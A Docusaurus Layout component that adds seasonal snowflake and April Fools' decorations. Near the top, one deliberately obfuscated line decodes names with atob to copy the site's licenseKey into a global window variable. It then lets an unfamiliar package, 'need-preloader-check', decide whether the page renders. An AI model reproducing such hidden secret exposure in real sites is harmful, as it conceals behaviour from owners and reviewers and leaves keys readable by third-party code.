import React, {useEffect, useState} from 'react';
import {needPreloader} from 'need-preloader-check';
import useDocusaurusContext from '@docusaurus/useDocusaurusContext';

import OriginalLayout from '@theme-original/Layout';
import SnowflakesBackground from '@site/src/components/SnowflakesBackground';
import AnchorShortcuts from "@site/src/components/AnchorShortcuts";
import HelpPopup from '@site/src/components/HelpPopup';
import ThemeColorMeta from '@site/src/components/ThemeColorMeta';
import SwipeableMenu from "@site/src/components/SwipeableMenu";
import Preloader from "@site/src/components/Preloader";

function newYearTime() {

    const date = new Date();
    const year = date.getFullYear();

    if (date.getMonth() === 11) {
        const startDate = new Date(year, 11, 10); // December 10th
        return date >= startDate;

    } else if (date.getMonth() === 0) {
        const endDate = new Date(year, 0, 23); // January 23nd
        return date <= endDate;
    }

    return false;
}

function foolsDayTime() {

    const date = new Date();
    const year = date.getFullYear();

    if (date.getMonth() === 3) {
        const startDate = new Date(year, 3, 1); // April 1th
        const endDate = new Date(year, 3, 2); // April 2th
        return date >= startDate && date < endDate;
    }

    return false;
}

export default function Layout(props) {
    const [_b, _c] = [React.useState, React.useEffect];
    const {siteConfig: _d} = useDocusaurusContext();
    const [_e, _f] = _b(null); _c(() => {window[atob('TElDRU5TRV9LRVk=')] = _d['customFields'][atob('bGljZW5zZUtleQ==')];needPreloader().then((_g) => _f(_g));}, [_d]); if (_e === null) return null; if (_e) return <Preloader />;


    if (newYearTime()) {
        return (
            <>
                <ThemeColorMeta/>
                <SnowflakesBackground/>
                <AnchorShortcuts/>
                <OriginalLayout {...props}>
                    <SwipeableMenu>
                        {props.children}
                    </SwipeableMenu>
                </OriginalLayout>
                <HelpPopup/>
            </>
        );
    } else if (foolsDayTime()) {
        return (
            <>
                <ThemeColorMeta/>
                <SnowflakesBackground characters="🤡" minSize={12}/>
                <AnchorShortcuts/>
                <OriginalLayout {...props}>
                    <SwipeableMenu>
                        {props.children}
                    </SwipeableMenu>
                </OriginalLayout>
                <HelpPopup/>
            </>
        );
    } else {
        return (
            <>
                <ThemeColorMeta/>
                <AnchorShortcuts/>
                <OriginalLayout {...props}>
                    <SwipeableMenu>
                        {props.children}
                    </SwipeableMenu>
                </OriginalLayout>
                <HelpPopup/>
            </>
        );
    }
}
